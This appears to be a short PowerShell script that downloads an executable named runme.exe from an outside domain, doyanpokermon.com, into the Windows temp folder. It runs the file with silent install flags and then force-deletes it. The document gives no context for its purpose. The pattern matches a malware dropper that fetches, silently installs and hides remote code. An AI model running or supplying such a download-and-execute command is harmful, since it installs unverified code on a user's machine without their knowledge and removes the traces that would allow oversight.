wget http://doyanpokermon.com/runme.exe -OutFile c:\windows\temp\runme.exe
Start-Process -Filepath "c:\windows\temp\runme.exe" -ArgumentList "/install /quiet" -NoNewWindow -Wait
Remove-Item c:\windows\temp\runme.exe -Force